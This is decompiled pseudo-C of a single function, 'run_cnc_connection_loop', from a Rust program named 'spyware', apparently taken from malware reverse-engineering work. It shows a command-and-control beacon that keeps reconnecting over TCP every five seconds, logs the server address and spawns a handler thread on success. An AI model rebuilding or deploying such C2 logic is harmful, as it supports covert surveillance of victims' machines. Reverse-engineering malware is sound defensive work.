
  void spyware::run_cnc_connection_loop::h099cfaaaff629944() __noreturn

{
    while (true)
    {
        void** const var_e0 = &data_4b93a8;
        int64_t (* var_d8_1)(int64_t* arg1, int64_t* arg2) =
            _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h412b806372427b66;
        void* const var_d0_1 = &data_41281a;
        uint64_t (* var_c8_1)(int16_t* arg1, char* arg2) = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$u16$GT$::fmt::hca7847b10460df25;
        void* const var_110 = &data_4b9348;
        int64_t var_108_1 = 2;
        int64_t var_f0_1 = 0;
        void** const* var_100_1 = &var_e0;
        int64_t var_f8_1 = 2;
        int128_t var_60;
        core::option::Option$LT$T$GT$::map_or_else::h31b26472792d6da3(&var_60, &var_110);
        int128_t var_78 = var_60;
        int64_t var_50;
        int64_t var_68_1 = var_50;
        char var_a8;
        std::net::tcp::TcpStream::connect::h95ced5f18ca8792f(&var_a8, &var_78);
        int128_t** var_b8;
        int128_t** var_98;
        int128_t* var_48;
        
        if (!(var_a8 & 1))
        {
            int32_t var_a4;
            int32_t var_114 = var_a4;
            
            if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 3)
            {
                std::net::tcp::TcpStream::peer_addr::h9ccf6949693ba95c(&var_110, &var_114);
                core::result::Result$LT$T$C$E$GT$::unwrap::hde1314fe5351d8d1(&var_98, &var_110);
                _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::hb4d4415e985a544c(&var_48, &var_98);
                var_b8 = &var_48;
                int64_t (* var_b0_1)(void* arg1, int64_t* arg2) = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
                var_110 = &data_4b9368;
                int64_t var_108_3 = 2;
                int64_t var_f0_3 = 0;
                int128_t*** var_100_3 = &var_b8;
                int64_t var_f8_3 = 1;
                int64_t rax_7 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b93d0);
                var_e0 = "spyware:Successfully connected t…";
                int64_t var_d8_3 = 7;
                char const* const var_d0_3 = "spyware:Successfully connected t…";
                int64_t var_c8_3 = 7;
                int64_t var_c0_2 = rax_7;
                log::__private_api::log::h13afddf373bd7d7f(&var_110, 3, &var_e0);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h46afe0b9deda2fc5(&var_48);
            }
            
            int64_t var_100_4 = -0x8000000000000000;
            var_110 = nullptr;
            char var_e8_1 = 0;
            std::thread::Builder::spawn_unchecked::h9fd01dc985f8c9d4(&var_e0, &var_110);
            core::result::Result$LT$T$C$E$GT$::expect::h0214701cb0e2f56b(&var_110, &var_e0);
            core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$$GT$::hc1f2d39e06124517(&var_110);
        }
        else
        {
            int128_t** var_a0;
            var_b8 = var_a0;
            
            if (core::sync::atomic::atomic_load::h8c88032dab18ab12())
            {
                var_48 = &var_78;
                var_98 = &var_48;
                int64_t (* var_90_1)(int64_t* arg1, int64_t* arg2) =
                    _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h5f99fd476a35f039;
                int64_t* var_88_1 = &var_b8;
                int64_t (* var_80_1)(int64_t* arg1, int64_t* arg2) = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
                var_110 = &data_4b9388;
                int64_t var_108_2 = 2;
                int64_t var_f0_2 = 0;
                int128_t*** var_100_2 = &var_98;
                int64_t var_f8_2 = 2;
                int64_t rax_4 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9400);
                var_e0 = "spyware:Successfully connected t…";
                int64_t var_d8_2 = 7;
                char const* const var_d0_2 = "spyware:Successfully connected t…";
                int64_t var_c8_2 = 7;
                int64_t var_c0_1 = rax_4;
                log::__private_api::log::h13afddf373bd7d7f(&var_110, 1, &var_e0);
            }
            
            core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_b8);
        }
        std::thread::sleep::h1a6eeffe1c923e1f(5, 0);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h46afe0b9deda2fc5(&var_78);
    }
}
